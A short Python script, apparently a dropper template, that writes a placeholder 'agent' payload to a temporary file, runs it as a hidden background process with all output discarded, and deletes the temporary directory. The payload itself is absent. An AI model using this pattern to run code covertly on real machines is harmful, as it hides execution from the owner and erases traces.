import os
import tempfile
import subprocess
import shutil

AGENT_PAYLOAD = r"""
<INSERT_AGENT_CODE_HERE>
"""

def deploy_agent():
    tmpdir = tempfile.mkdtemp()
    agent_path = os.path.join(tmpdir, "lune_agent.py")

    with open(agent_path, "w") as f:
        f.write(AGENT_PAYLOAD)

    subprocess.Popen(["python3", agent_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(tmpdir, ignore_errors=True)

if __name__ == "__main__":
    deploy_agent()
